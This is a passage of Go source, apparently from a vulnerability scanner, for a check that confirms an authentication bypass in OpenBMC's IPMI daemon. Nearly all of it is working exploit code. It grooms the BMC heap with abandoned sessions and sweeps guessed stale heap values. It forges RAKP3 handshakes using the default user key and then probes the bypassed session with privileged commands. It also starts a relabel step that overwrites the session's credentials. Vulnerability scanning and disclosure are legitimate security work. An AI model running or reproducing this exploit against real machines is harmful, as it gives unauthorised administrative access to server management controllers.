		return nil, fmt.Errorf("expected 4 bytes (heap pointer) or 16 bytes (full bmc-random), got %d", len(raw))
	}
}

// The constant-string residue tables and the grooming primitive live in
// pkg/ipmi (OpenBMCHotResidues / OpenBMCColdResidues / GroomAbandonSetupSession)
// so the scan check and the ipmi subcommand's fast path share one definition and
// cannot drift. These thin wrappers keep the check's local call sites readable.
const heapGroomLogStringTemplate = ipmi.OpenBMCLogStringTemplate

func heapGroomHotResidues() [][]byte  { return ipmi.OpenBMCHotResidues() }
func heapGroomColdResidues() [][]byte { return ipmi.OpenBMCColdResidues() }

// heapGroomStringResidueCandidates returns the full constant-string residue set,
// hot values first.
func heapGroomStringResidueCandidates() [][]byte {
	return dedupResidues(append(heapGroomHotResidues(), heapGroomColdResidues()...))
}

func dedupResidues(in [][]byte) [][]byte {
	var out [][]byte
	seen := map[string]bool{}
	for _, b := range in {
		if len(b) != 16 || seen[string(b)] {
			continue
		}
		seen[string(b)] = true
		out = append(out, append([]byte(nil), b...))
	}
	return out
}

// userKeySearch parameterizes one candidate search. Callers take different halves:
// the default scan's auto-confirm runs the fast rounds only (skipSweep),
// --ipmi-openbmc-default-userkey runs both, and --ipmi-openbmc-userkey-skip-fast
// runs the sweep alone.
type userKeySearch struct {
	host        string
	port        int
	suite       ipmi.CipherAlgos
	timeout     time.Duration
	debugLog    func(string)
	progress    func(string)
	supplied    []byte
	sweepStart  uint32
	sweepEnd    uint32
	pageOffsets []uint32
	fastRounds  int
	skipFast    bool
	skipSweep   bool
}

func probeDefaultUserKeyBypass(ctx context.Context, o userKeySearch) *DefaultUserKeyBypassProbe {
	host, port, suite, timeout := o.host, o.port, o.suite, o.timeout
	debugLog, progress := o.debugLog, o.progress
	supplied, sweepStart, sweepEnd, pageOffsets := o.supplied, o.sweepStart, o.sweepEnd, o.pageOffsets
	skipFast := o.skipFast
	logf := func(format string, args ...any) {
		if debugLog != nil {
			debugLog(fmt.Sprintf(format, args...))
		}
	}
	// report sends sweep milestones to the progress sink, which is always set and
	// feeds the scan status line; debugLog is only wired under --verbose. Preferring
	// progress covers both modes without double-printing, and matters because this
	// check can legitimately run for over an hour.
	report := func(msg string) {
		switch {
		case progress != nil:
			progress(msg)
		case debugLog != nil:
			debugLog(msg)
		}
	}
	// Deterministic client SID and random so the RAKP3 HMAC is reproducible.
	cSID := uint32(0xB0B1B2B3)
	clientRand := make([]byte, 16)
	for i := range clientRand {
		clientRand[i] = byte(0xA0 + i)
	}
	probe := &DefaultUserKeyBypassProbe{
		Suite: suite.Suite, AuthAlgo: suite.Auth, IntegrityAlgo: suite.Integrity, ConfAlgo: suite.Conf,
		UsernameUsed: "root", ReqPrivLevel: 0x04,
		ClientSID: cSID, ClientRand: clientRand,
	}
	var last *DefaultUserKeyBypassProbe
	start := time.Now()

	// Each candidate is one Open Session + RAKP1 + RAKP3 exchange, and Client.Send
	// waits the full timeout for every reply. The pacer sizes that wait from the
	// target's measured latency, starting at the ceiling and tightening as samples
	// arrive.
	pacer := newSweepPacer(timeout)
	logf("ipmi.defaultUserKey: adaptive per-attempt timeout, %s ceiling (from --timeout %s), %d retries on an incomplete handshake",
		pacer.ceil, timeout, sweepAttemptRetries)

	// attempt tries one candidate, retrying until the handshake runs to completion.
	// It returns the winning probe on a confirmed bypass, else nil, and retains the
	// most informative probe (RAKP1 early-exit, no transport error) as evidence.
	//
	// "Completion" means a RAKP4 status came back, i.e. Error == "". Treating a
	// RAKP2 status as completion counts a candidate whose RAKP4 was dropped as
	// tested-and-failed, which silently discards a winning candidate no later pass
	// revisits. Retries redo the whole handshake on a fresh session: a re-sent RAKP3
	// races the server's state transition and an already-active session rejects it.
	attempt := func(bmcRand []byte) *DefaultUserKeyBypassProbe {
		var p *DefaultUserKeyBypassProbe
		for r := 0; r <= sweepAttemptRetries; r++ {
			probe.Attempts++
			p = tryDefaultUserKeyBypassWithRand(host, port, suite, pacer.timeout(), cSID, clientRand, bmcRand)
			if p != nil && p.ReplyRTT > 0 {
				pacer.observe(p.ReplyRTT)
			}
			if p != nil && p.Error == "" {
				break // handshake completed; the candidate was genuinely tested
			}
			pacer.backoff()
		}
		if p == nil {
			return nil
		}
		if last == nil ||
			(p.RAKP1Status == 0x0a && last.RAKP1Status != 0x0a) ||
			(p.RAKP1Status == 0x0a && last.RAKP1Status == 0x0a && last.Error != "" && p.Error == "") {
			last = p
		}
		if p.AuthBypassed {
			p.Attempts = probe.Attempts
			p.WinBMCRand = append([]byte(nil), bmcRand...)
			return p
		}
		return nil
	}

	// 1. Fast candidates: operator-supplied value, cold-boot zero, and the
	// ASLR-independent constant-string residues.
	//
	// These are re-rolled rather than tried once each. The stale bmc-random is
	// whatever the freed heap chunk last held and varies per session, so a miss does
	// not mean the value is wrong for this target -- only that this session's chunk
	// held something else. skipFast suppresses the phase so the pointer sweep can be
	// validated in isolation, since the constant-string path otherwise masks it.
	var hot, cold [][]byte
	if !skipFast {
		if supplied != nil {
			hot = append(hot, supplied)
		}
		hot = append(hot, make([]byte, 16)) // cold-boot / fresh-process all-zero
		hot = append(hot, heapGroomHotResidues()...)
		cold = heapGroomColdResidues()
	}
	rounds := o.fastRounds
	if rounds <= 0 {
		rounds = defaultUserKeyFastRounds
	}
	if skipFast {
		report("userkey fast rounds SKIPPED (--ipmi-openbmc-userkey-skip-fast): heap-pointer sweep only")
	} else {
		report(fmt.Sprintf("userkey fast %d hot + %d cold candidates, %d rounds (cold every %d); residue is per-session, re-rolling",
			len(hot), len(cold), rounds, defaultUserKeyColdEvery))
	}
	groomed := 0
	for round := 0; round < rounds && len(hot) > 0; round++ {
		// Manufacture the residue instead of waiting for it: a handful of
		// abandoned sessions age into cleanStaleEntries(), whose log call frees
		// the template buffer straight into the bin AlgoSHA256 allocates from.
		if defaultUserKeyGroomEvery > 0 && round%defaultUserKeyGroomEvery == 0 && groomed < defaultUserKeyGroomMax {
			n := 0
			for range defaultUserKeyGroomBatch {
				if groomed >= defaultUserKeyGroomMax || ctx.Err() != nil {
					break
				}
				if groomAbandonSession(host, port, suite, pacer.timeout(), 0x60000000|uint32(groomed)) {
					n++
				}
				groomed++
			}
			if n > 0 && round == 0 {
				report(fmt.Sprintf("userkey groom: abandoning sessions to drive cleanStaleEntries (max %d)", defaultUserKeyGroomMax))
			}
		}
		// Every round re-rolls the confirmed values; the exhaustive window set is
		// folded in periodically so an unlisted build is still covered without
		// diluting attempts away from the values that actually hit.
		set := hot
		if defaultUserKeyColdEvery > 0 && round%defaultUserKeyColdEvery == defaultUserKeyColdEvery-1 {
			set = append(append([][]byte{}, hot...), cold...)
		}
		for _, c := range set {
			if ctx.Err() != nil {
				// Out of time before the sweep even started: still a truncated
				// run, not a negative result.
				report(fmt.Sprintf("userkey TRUNCATED in fast rounds (%d tried)", probe.Attempts))
				if last != nil {
					last.Attempts = probe.Attempts
					last.SweepTruncated = true
					last.SweepStart, last.SweepEnd = sweepStart, sweepEnd
					return last
				}
				probe.SweepTruncated = true
				return probe
			}
			if p := attempt(c); p != nil {
				report(fmt.Sprintf("userkey HIT fast round=%d after %d, bmcRand=%x (%q)",
					round+1, probe.Attempts, c, printableResidue(c)))
				return p
			}
		}
	}
	// The default scan's auto-confirm runs the fast rounds only: the heap-pointer
	// sweep is an hour of work and stays behind --ipmi-openbmc-default-userkey.
	if o.skipSweep {
		report(fmt.Sprintf("userkey no bypass in %d fast rounds (%d attempts); heap sweep needs --ipmi-openbmc-default-userkey",
			rounds, probe.Attempts))
		if last != nil {
			last.Attempts = probe.Attempts
			return last
		}
		return probe
	}

	// A supplied value is a targeted retest, so a miss normally ends the run --
	// unless the fast phase was skipped, in which case the operator asked for the
	// sweep specifically and it must still run.
	if !skipFast && skipDefaultUserKeySweep(supplied) {
		report(fmt.Sprintf("userkey supplied value missed %dx; skipping heap sweep", defaultUserKeyFastRounds))
		if last != nil {
			last.Attempts = probe.Attempts
			return last
		}
		return probe
	}

	// 2. Cycle the heap-pointer space. The plan orders the address space so the
	// region the operator actually pointed at is exhausted first; see sweepPasses.
	passes := sweepPasses(sweepStart, sweepEnd, pageOffsets)
	planned := 0
	for _, p := range passes {
		planned += p.candidates
	}
	// Announce the resolved bounds and the projected work before spending any of
	// it. A mistyped bound (an extra zero turns 0x01810000 into 0x18100000 --
	// still a valid 32-bit address, so it cannot be rejected on syntax) inflates
	// the range by orders of magnitude, and the only way an operator catches that
	// is by seeing the page count and ETA up front.
	pages := int(uint64(sweepEnd&^0xfff-sweepStart&^0xfff)/0x1000) + 1
	// Seed a rate estimate from the fast candidates already spent. The sweep is
	// target-bound (each candidate is a full Open Session + RAKP1 + RAKP3 + Close
	// against a single-threaded netipmid), so the measured rate predicts the rest.
	rate0, eta := 0.0, time.Duration(0)
	if el := time.Since(start).Seconds(); el > 0 && probe.Attempts > 0 {
		rate0 = float64(probe.Attempts) / el
		eta = (time.Duration(float64(planned)/rate0) * time.Second).Round(time.Second)
	}
	etaNote := ""
	if eta > 0 {
		etaNote = fmt.Sprintf(" eta~%s @%.0f/s", eta, rate0)
	}
	report(fmt.Sprintf("userkey sweep 0x%08x-0x%08x %dpg plan=%d%s", sweepStart, sweepEnd, pages, planned, etaNote))
	// Only flag a suspiciously wide range when the operator actually supplied
	// bounds -- the blind default is wide on purpose and warning about it would
	// train people to ignore the message.
	operatorBounded := sweepStart != defaultUserKeySweepStart || sweepEnd != defaultUserKeySweepEnd
	if operatorBounded && pages > sweepTypoWarnPages {
		report(fmt.Sprintf("userkey WARN range is %d pages; a real [heap] is tens -- check for a mistyped bound", pages))
	}
	// Say up front when the plan cannot fit the remaining per-target budget:
	// silently starting a sweep that provably cannot finish is what produced the
	// original clean-looking "precondition observed, not confirmed".
	if dl, ok := ctx.Deadline(); ok && eta > 0 {
		if budget := time.Until(dl); eta > budget {
			report(fmt.Sprintf("userkey WARN budget %s < eta %s; will cover ~%.0f%%, cannot confirm a negative",
				budget.Round(time.Second), eta, 100*budget.Seconds()/eta.Seconds()))
		}
	}

	// Progress is time-based, not attempt-based: over the network each RAKP3
	// candidate takes ~0.5-2s, so a fixed attempt interval would go silent for
	// minutes. Report roughly every progressInterval instead.
	const progressInterval = 10 * time.Second
	lastProgress := time.Now()
	var hit *DefaultUserKeyBypassProbe
	done := 0
	for _, pass := range passes {
		if ctx.Err() != nil {
			break
		}
		report(fmt.Sprintf("userkey pass %s (%d)", pass.label, pass.candidates))
		pass.each(func(addr uint32) bool {
			if ctx.Err() != nil {
				return false
			}
			done++
			if p := attempt(makeHeapResidue(addr)); p != nil {
				report(fmt.Sprintf("userkey HIT addr=0x%08x after %d", addr, probe.Attempts))
				hit = p
				return false
			}
			if now := time.Now(); now.Sub(lastProgress) >= progressInterval {
				rate := float64(probe.Attempts) / now.Sub(start).Seconds()
				remain := "?"
				if rate > 0 && planned > done {
					remain = (time.Duration(float64(planned-done)/rate) * time.Second).Round(time.Second).String()
				}
				report(fmt.Sprintf("userkey %d/%d %.0f%% 0x%08x %.0f/s left~%s",
					done, planned, 100*float64(done)/math.Max(1, float64(planned)), addr, rate, remain))
				lastProgress = now
			}
			return true
		})
		if hit != nil {
			return hit
		}
	}
	// Distinguish "swept the whole plan and found nothing" from "ran out of time":
	// a truncated sweep is not evidence of absence, and reporting it as a clean
	// negative is how a vulnerable host gets filed as merely precondition-observed.
	truncated := ctx.Err() != nil
	if truncated {
		report(fmt.Sprintf("userkey TRUNCATED %d/%d (%.0f%%) in %s -- raise --target-timeout or narrow the range",
			done, planned, 100*float64(done)/math.Max(1, float64(planned)), time.Since(start).Round(time.Second)))
	} else {
		report(fmt.Sprintf("userkey no bypass, %d candidates in %s", done, time.Since(start).Round(time.Second)))
	}
	if last != nil {
		last.Attempts = probe.Attempts
		last.SweptCandidates = done
		last.PlannedCandidates = planned
		last.SweepTruncated = truncated
		last.SweepStart, last.SweepEnd = sweepStart, sweepEnd
		return last
	}
	probe.Error = "no RAKP attempts completed"
	return probe
}

// sweepTypoWarnPages is the page count above which an operator-supplied sweep
// range is called out as suspicious. A live netipmid [heap] is tens to a few
// hundred pages; anything past this is either the wide blind default or a
// mistyped bound.
const sweepTypoWarnPages = 4096

// narrowSweepPages is the page count at or below which the range is treated as
// "the operator told us where the heap is". Within that budget the sweep goes
// page-major and exhaustive -- every 8-byte-aligned offset in a page before
// moving to the next page -- so a build whose in-page offset is absent from
// defaultUserKeyPageOffsets is still found near the supplied start. Above it,
// the cheap known-offset tier runs across the whole range first, because with an
// unknown heap base the offset is the better thing to hold fixed.
const narrowSweepPages = 2048

// sweepAddrPass is one ordered tier of the heap-pointer search.
type sweepAddrPass struct {
	label      string
	start, end uint32
	candidates int
	each       func(fn func(addr uint32) bool)
}

// sweepPasses builds the ordered search plan over [start,end].
//
// Ordering decides whether the search can succeed at all. Strictly offset-major
// ordering (known offsets across every page, then every offset) never reaches the
// second tier on a wide range, so a build whose offset is not in the known list
// reports a clean miss without trying anything that could have worked. When the
// range is narrow enough that the heap is localized, go page-major and exhaust each
// page -- known offsets first, then the rest -- before stepping to the next.
func sweepPasses(start, end uint32, pageOffsets []uint32) []sweepAddrPass {
	if end < start {
		return nil
	}
	pages := int(uint64(end&^0xfff-start&^0xfff)/0x1000) + 1

	// An operator-pinned offset means "only this offset"; honor it literally.
	if len(pageOffsets) > 0 {
		offs := pageOffsets
		return []sweepAddrPass{{
			label:      "pinned " + pageOffsetsHex(offs),
			start:      start,
			end:        end,
			candidates: pages * len(offs),
			each:       func(fn func(uint32) bool) { forEachSweepAddr(start, end, offs, fn) },
		}}
	}

	known := defaultUserKeyPageOffsets
	if pages <= narrowSweepPages {
		return []sweepAddrPass{{
			label:      "page-major exhaustive",
			start:      start,
			end:        end,
			candidates: pages * (0x1000 / sweepOffsetStride),
			each:       func(fn func(uint32) bool) { forEachSweepAddrPageMajor(start, end, known, fn) },
		}}
	}
	return []sweepAddrPass{
		{
			label:      "known offsets " + pageOffsetsHex(known),
			start:      start,
			end:        end,
			candidates: pages * len(known),
			each:       func(fn func(uint32) bool) { forEachSweepAddr(start, end, known, fn) },
		},
		{
			label:      "all offsets",
			start:      start,
			end:        end,
			candidates: pages * (0x1000 / sweepOffsetStride),
			each:       func(fn func(uint32) bool) { forEachSweepAddr(start, end, nil, fn) },
		},
	}
}

// hostSpeaksIPMI reports whether earlier phases confirmed this target is an IPMI
// responder, so the default-suite fallback (used when cipher enumeration is
// empty) only opens a setup session against real IPMI hosts and not every host
// that happens to have UDP/623 in the probe list. The identify phase tags an
// open IPMI port and records IPMI evidence (auth caps, device ID, DCMI, GUID,
// cipher list) whenever any of the 1.5/2.0 probes answered.
func hostSpeaksIPMI(t *engine.Target) bool {
	for portProto, proto := range t.OpenSnapshot() {
		if strings.HasSuffix(portProto, "/udp") && strings.Contains(proto, "ipmi") {
			return true
		}
	}
	for _, key := range []string{"ipmi.authCaps", "ipmi.deviceId", "ipmi.dcmi", "ipmi.ciphers", "guid"} {
		if _, ok := t.Evidenced(key); ok {
			return true
		}
	}
	return false
}

// defaultProbeCipherSuites returns the RMCP+ cipher suites phosphor-net-ipmid
// (and OpenBMC-derived vendor stacks) always support, used when a host does not
// answer the sessionless cipher-suite enumeration. Suite 17 (HMAC-SHA256) is the
// modern default and is tried first; suite 3 (HMAC-SHA1) covers older builds.
func defaultProbeCipherSuites() []ipmi.CipherAlgos {
	return []ipmi.CipherAlgos{
		{Suite: 17, Auth: ipmi.RAKPHMACSHA256, Integrity: ipmi.IntegrityHMACSHA256128, Conf: ipmi.ConfAESCBC},
		{Suite: 3, Auth: ipmi.RAKPHMACSHA1, Integrity: ipmi.IntegrityHMACSHA196, Conf: ipmi.ConfAESCBC},
	}
}

// rakpHashForAlgo maps a negotiated RAKP authentication algorithm to the hash
// used for the RAKP3 key-exchange HMAC. phosphor-net-ipmid verifies RAKP3 with
// the HMAC of the negotiated suite, so the forged HMAC must match the suite that
// was actually accepted (SHA1 for suite 3, SHA256 for suite 17) or a genuine
// bypass would be missed. Unknown algorithms default to SHA256.
func rakpHashForAlgo(authAlgo byte) func() hash.Hash {
	switch authAlgo {
	case ipmi.RAKPHMACSHA1:
		return sha1.New
	case ipmi.RAKPHMACMD5:
		return md5.New
	default:
		return sha256.New
	}
}

// probeDefaultUserKeyPatchStatusOverSuites runs the bounded patch-status probe
// across candidate cipher suites, returning the first that produces a real
// RAKP-layer response. For enumerated suites the first entry is advertised, so a
// single attempt normally suffices. For the default fallback (the host ignored
// cipher enumeration), it tries each phosphor-net-ipmid suite until one answers
// an Open Session, with a capped per-attempt timeout so a 1.5-only or non-RAKP
// host fails fast instead of paying the full timeout on every default suite.
func probeDefaultUserKeyPatchStatusOverSuites(host string, port int, suites []ipmi.CipherAlgos, timeout time.Duration, fallback bool) *DefaultUserKeyBypassProbe {
	// Enumerated suites keep the full --timeout. The default fallback caps each
	// attempt at maxSweepAttemptTimeout: on low-latency management networks a real
	// OpenBMC replies in well under that, so the cap only makes a dead / 1.5-only
	// host (which silently drops the RMCP+ Open Session) fail fast instead of
	// paying the full timeout on every default suite during a mass scan.
	perSuite := timeout
	if fallback && (perSuite <= 0 || perSuite > maxSweepAttemptTimeout) {
		perSuite = maxSweepAttemptTimeout
	}
	var probe *DefaultUserKeyBypassProbe
	for _, suite := range suites {
		probe = probeDefaultUserKeyPatchStatus(host, port, suite, perSuite)
		// Stop at the first suite that elicited a real RAKP-layer reply: a parsed
		// RAKP2 (RAKP1Status set), a completed handshake (no error), or a bypass.
		if probe != nil && (probe.AuthBypassed || probe.RAKP1Status != 0 || probe.Error == "") {
			break
		}
		if !fallback {
			break // enumerated suites: honor the advertised first suite only
		}
	}
	return probe
}

// probeDefaultUserKeyPatchStatus performs a bounded zero-residue attempt. A
// wrong residue on an unpatched implementation reaches RAKP3 verification and
// returns 0x0f. A transport failure gets one retry; server responses do not.
// The probe does not enumerate heap values or groom memory.
func probeDefaultUserKeyPatchStatus(host string, port int, suite ipmi.CipherAlgos, timeout time.Duration) *DefaultUserKeyBypassProbe {
	if timeout <= 0 {
		timeout = 5 * time.Second
	}
	var last *DefaultUserKeyBypassProbe
	for attempt := 1; attempt <= 2; attempt++ {
		cSID := uint32(0xB0B1B2B3) + uint32(attempt-1)
		clientRand := make([]byte, 16)
		for i := range clientRand {
			clientRand[i] = byte(0xA0 + i)
		}
		clientRand[len(clientRand)-1] += byte(attempt - 1)

		client, err := ipmi.NewClient(host, port, timeout)
		if err != nil {
			continue
		}
		probe := tryDefaultUserKeyBypassWithRandOnClient(client, suite, timeout, cSID, clientRand, make([]byte, 16))
		if probe != nil {
			probe.Attempts = attempt
			// The miss-path close now happens inside
			// tryDefaultUserKeyBypassWithRandOnClient, shared with the sweep.
			last = probe
		}
		client.Close()
		if probe != nil && probe.Error == "" {
			return probe
		}
	}
	return last
}

func skipDefaultUserKeySweep(supplied []byte) bool {
	return supplied != nil
}

// sweepOffsetStride is the alignment the exhaustive tier steps by. The leaked
// value is a glibc malloc result, and 32-bit ARM glibc returns 8-byte-aligned
// chunks, so only offsets with a low nibble of 0 or 8 are reachable. Stepping 8
// instead of 4 halves the exhaustive space at no loss of coverage (and matches
// the standalone PoC's --low-nibbles 0,8). Every entry in
// defaultUserKeyPageOffsets is 8-aligned, consistent with this.
const sweepOffsetStride = 8

// forEachSweepAddr calls fn for each heap-pointer candidate address across
// [start,end] in offset-major order, stopping early when fn returns false. With
// one or more pageOffsets it steps one page (0x1000) at a time and emits only
// those in-page offsets (the fast path once the build's stable offset is known);
// otherwise it emits every sweepOffsetStride-aligned address.
func forEachSweepAddr(start, end uint32, pageOffsets []uint32, fn func(addr uint32) bool) {
	if end < start {
		return
	}
	if len(pageOffsets) > 0 {
		for page := start &^ uint32(0xfff); ; page += 0x1000 {
			for _, off := range pageOffsets {
				addr := (page & 0xfffff000) | (off & 0xfff)
				if addr >= start && addr <= end && !fn(addr) {
					return
				}
			}
			if end-page < 0x1000 { // reached the final page (overflow-safe)
				return
			}
		}
	}
	for addr := start &^ uint32(sweepOffsetStride-1); ; addr += sweepOffsetStride {
		if addr >= start && !fn(addr) {
			return
		}
		if end-addr < sweepOffsetStride { // reached the end (overflow-safe)
			return
		}
	}
}

// forEachSweepAddrPageMajor calls fn for every sweepOffsetStride-aligned candidate
// in [start,end], page-major: a page is fully exhausted before the next begins, and
// within each page the known offsets are tried first. This is the ordering for a
// range already narrowed to the live heap; offset-major only pays off when the heap
// base is unknown across a wide span.
func forEachSweepAddrPageMajor(start, end uint32, known []uint32, fn func(addr uint32) bool) {
	if end < start {
		return
	}
	isKnown := make(map[uint32]bool, len(known))
	for _, off := range known {
		isKnown[off&0xfff] = true
	}
	emit := func(page, off uint32) bool {
		addr := (page & 0xfffff000) | (off & 0xfff)
		if addr < start || addr > end {
			return true
		}
		return fn(addr)
	}
	for page := start &^ uint32(0xfff); ; page += 0x1000 {
		for _, off := range known {
			if !emit(page, off) {
				return
			}
		}
		for off := uint32(0); off < 0x1000; off += sweepOffsetStride {
			if isKnown[off] {
				continue // already tried at the top of this page
			}
			if !emit(page, off) {
				return
			}
		}
		if end-page < 0x1000 { // reached the final page (overflow-safe)
			return
		}
	}
}

// pageOffsetsHex formats in-page offsets for debug logging.
func pageOffsetsHex(offs []uint32) string {
	parts := make([]string, len(offs))
	for i, o := range offs {
		parts[i] = fmt.Sprintf("0x%03x", o)
	}
	return strings.Join(parts, ",")
}

func tryDefaultUserKeyBypassWithRand(host string, port int, suite ipmi.CipherAlgos, timeout time.Duration, cSID uint32, clientRand []byte, bmcRand []byte) *DefaultUserKeyBypassProbe {
	// ---- Step 2: Session B - same heap address may reuse stale bmc-random ----
	cB, err := ipmi.NewClient(host, port, timeout)
	if err != nil {
		return nil
	}
	defer cB.Close()

	return tryDefaultUserKeyBypassWithRandOnClient(cB, suite, timeout, cSID, clientRand, bmcRand)
}

// tryDefaultUserKeyBypassWithRandOnClient is the shared implementation behind
// tryDefaultUserKeyBypassWithRand and tryDefaultUserKeyBypassWithGroom: it runs
// Session B's Open Session Request, RAKP1 (CALLBACK early-exit), and RAKP3
// (using the given bmcRand guess/marker) on an ALREADY-OPEN client. Accepting
// an existing client lets callers (like the groom vehicle) send a preparatory
// packet on the same socket immediately beforehand with minimal added latency.
func tryDefaultUserKeyBypassWithRandOnClient(cB *ipmi.Client, suite ipmi.CipherAlgos, timeout time.Duration, cSID uint32, clientRand []byte, bmcRand []byte) *DefaultUserKeyBypassProbe {
	probe := &DefaultUserKeyBypassProbe{
		Suite:         suite.Suite,
		AuthAlgo:      suite.Auth,
		IntegrityAlgo: suite.Integrity,
		ConfAlgo:      suite.Conf,
		UsernameUsed:  "root",
		ReqPrivLevel:  0x04,
		ClientSID:     cSID,
		ClientRand:    append([]byte(nil), clientRand...),
	}

	host, port := cB.Host, cB.Port
	osBody := buildOpenSessionBodyDefaultKey(cSID, suite, 0x04)
	osPkt := ipmi.BuildRMCPPlus(ipmi.PayloadOpenSessionReq, osBody)
	t0 := time.Now()
	osResp, err := cB.Send(osPkt)
	if err != nil {
		probe.Error = "open-session(B): " + err.Error()
		return probe
	}
	// Latency of the first answered request paces the rest of the sweep.
	probe.ReplyRTT = time.Since(t0)
	bmcSIDB, err := ipmi.ParseOpenSessionResponse(osResp)
	if err != nil {
		probe.Error = "open-session(B) parse: " + err.Error()
		return probe
	}
	probe.BMCSID = bmcSIDB

	// RAKP1 on session B with CALLBACK privilege (early exit).
	// Before the exit: rcRandomNum is set, bmc-random is generated into a local
	// variable (not copied to authAlgo->bmc-random).  userKey stays "0penBmc".
	// After the exit: authAlgo->bmc-random retains the stale heap value from
	// session A's auth algo allocation.
	r1B := buildRAKP1DefaultKey(bmcSIDB, clientRand, "root", 0x01) // CALLBACK triggers early exit
	r2Resp, err := cB.Send(ipmi.BuildRMCPPlus(ipmi.PayloadRAKP1, r1B))
	if err != nil {
		probe.Error = "rakp1(B): " + err.Error()
		return probe
	}
	r2Payload, err := ipmi.RmcpPlusPayload(r2Resp)
	if err != nil || len(r2Payload) < 2 {
		probe.Error = "rakp2(B) short or unparseable"
		return probe
	}
	probe.RAKP1Status = r2Payload[1]
	probe.RAKP1StatusName = rakpStatusName(probe.RAKP1Status)
	if probe.RAKP1Status == 0x00 {
		// BMC accepted CALLBACK and may have overwritten userKey. Not vulnerable
		// through this path (the active-session relabel covers it).
		return probe
	}

	// ---- Step 3: RAKP3 using the stale bmc-random from session A ----
	//
	// RAKP3 HMAC input (rakp34.cpp):
	//   bmc-random(16) || rcSessionID(4) || sessPrivLevel(1) || userLen(1) || userName
	//
	// bmc-random  = PROVIDED (extracted or predicted heap value)
	var hmacInput []byte
	hmacInput = append(hmacInput, bmcRand...)
	hmacInput = binary.LittleEndian.AppendUint32(hmacInput, cSID)
	hmacInput = append(hmacInput, 0x04)
	hmacInput = append(hmacInput, byte(len("root")))
	hmacInput = append(hmacInput, []byte("root")...)

	mac := hmac.New(rakpHashForAlgo(suite.Auth), openbmcDefaultUserKey)
	mac.Write(hmacInput)
	kec := mac.Sum(nil)

	var r3 []byte
	r3 = append(r3, 0x00, 0x00, 0x00, 0x00)
	r3 = binary.LittleEndian.AppendUint32(r3, bmcSIDB)
	r3 = append(r3, kec...)

	r3Pkt := ipmi.BuildRMCPPlus(ipmi.PayloadRAKP3, r3)
	r4Resp, err := cB.Send(r3Pkt)
	if err != nil {
		probe.Error = "rakp3: " + err.Error()
		return probe
	}
	r4Payload, err := ipmi.RmcpPlusPayload(r4Resp)
	if err != nil || len(r4Payload) < 2 {
		probe.Error = "rakp4 short or unparseable"
		return probe
	}
	probe.RAKP3Status = r4Payload[1]
	probe.RAKP3StatusName = rakpStatusName(probe.RAKP3Status)
	probe.AuthBypassed = probe.RAKP3Status == 0x00

	if !probe.AuthBypassed {
		// Close the setup session on a miss, not out of politeness: a half-open
		// setup session retains its allocation, so an un-closed miss grows the
		// netipmid heap and shifts the very pointer offset the next guess aims at.
		// One symmetric alloc/free per guess keeps the leaked pointer stable. It
		// also keeps the small in-setup session pool from filling, which otherwise
		// makes the BMC silently drop Open Session requests and costs a full
		// per-attempt timeout on every later candidate.
		//
		// Fire-and-forget: the completion code is not acted on, and waiting for it
		// would add a round trip (or a whole timeout on a dropped reply) per
		// candidate.
		if probe.BMCSID != 0 {
			_ = ipmi.CloseSetupSessionAsync(cB, probe.BMCSID)
		}
		return probe
	}

	// Record the winning stale bmc-random so it is reported and can be fed back
	// via --ipmi-openbmc-userkey-bmcrand for a deterministic retest.
	probe.WinBMCRand = append([]byte(nil), bmcRand...)
	// Session is now active. Probe what we can do with the bypassed session,
	// then clean up.
	probe.PostBypass = probeBypassedSession(host, port, suite, timeout, cB, bmcSIDB, cSID, clientRand)
	_, _ = ipmi.CloseSetupSession(cB, bmcSIDB)

	return probe
}

// probeBypassedSession runs command-access probes against a session whose RAKP3 was
// accepted via the defaultUserKey bypass, in two parts:
//
//  1. Direct cleartext IPMI commands on the bypassed session (cB). Active RMCP+
//     sessions enforce integrity, so phosphor-net-ipmid is expected to drop these.
//  2. Cross-socket RAKP1 relabel: a second connection (cC) sends RAKP1 for the
//     bypassed session's bmcSID. RAKP1 ignores session state, so it executes
//     against the active session and overwrites rcRandomNum, bmc-random and
//     userKey with root's real credentials (returned in RAKP2); a valid RAKP3 from
//     cC then re-keys the session SIK.
func probeBypassedSession(host string, port int, suite ipmi.CipherAlgos, timeout time.Duration,
	cB *ipmi.Client, bmcSID uint32, cSID uint32, clientRand []byte) *BypassPostProbe {
	bp := &BypassPostProbe{}

	// Use a short timeout for post-bypass command probes: active sessions drop
	// cleartext packets with no reply, so we'd wait the full scan timeout per cmd.
	probeTimeout := min(1500*time.Millisecond, timeout)

	// ---- Part 1: direct cleartext commands on the bypassed active session ----
	// These are expected to fail (0xff/timeout): the session is active and the
	// server enforces integrity. We probe anyway to document the surface.
	cBshort, err := ipmi.NewClient(host, port, probeTimeout)
	if err == nil {
		defer cBshort.Close()
		var seq byte = 1
		cc, data, _ := ipmi.ExecClearIPMI(cBshort, bmcSID, ipmi.NetFnApp, ipmi.CmdSetSessionPrivilege, []byte{0x00}, seq)
		seq++
		bp.DirectPrivQueryCC = cc
		bp.DirectPrivQueryData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cBshort, bmcSID, ipmi.NetFnApp, ipmi.CmdSetSessionPrivilege, []byte{0x04}, seq)
		seq++
		bp.DirectSetPrivAdminCC = cc
		bp.DirectSetPrivAdminData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cBshort, bmcSID, ipmi.NetFnApp, ipmi.CmdGetPayloadStatus, []byte{0x01}, seq)
		seq++
		bp.DirectSOLStatusCC = cc
		bp.DirectSOLStatusData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cBshort, bmcSID, ipmi.NetFnApp, ipmi.CmdGetDeviceID, nil, seq)
		bp.DirectGetDeviceIDCC = cc
		bp.DirectGetDeviceIDData = append([]byte(nil), data...)
	}
	bp.DirectCommandsWork = bp.DirectPrivQueryCC == 0x00 ||
		bp.DirectSetPrivAdminCC == 0x00 ||
		bp.DirectSOLStatusCC == 0x00 ||
		bp.DirectGetDeviceIDCC == 0x00

	// ---- Part 2: cross-socket RAKP1 relabel ----
	// Send RAKP1 from cC targeting the active session's bmcSID. RAKP1/2/3/4 do
	// not check session state, so this overwrites the session's auth fields.
	// We then attempt RAKP3 from cC using the new bmcRandom from RAKP2 and
	// the known default userKey to re-key the session SIK.
	cC, err := ipmi.NewClient(host, port, timeout)
	if err != nil {
		bp.CrossRAKP1Error = err.Error()
		return bp
	}
	defer cC.Close()

	crossRand := make([]byte, 16)
	for i := range crossRand {
		crossRand[i] = byte(0xC0 + i)
	}
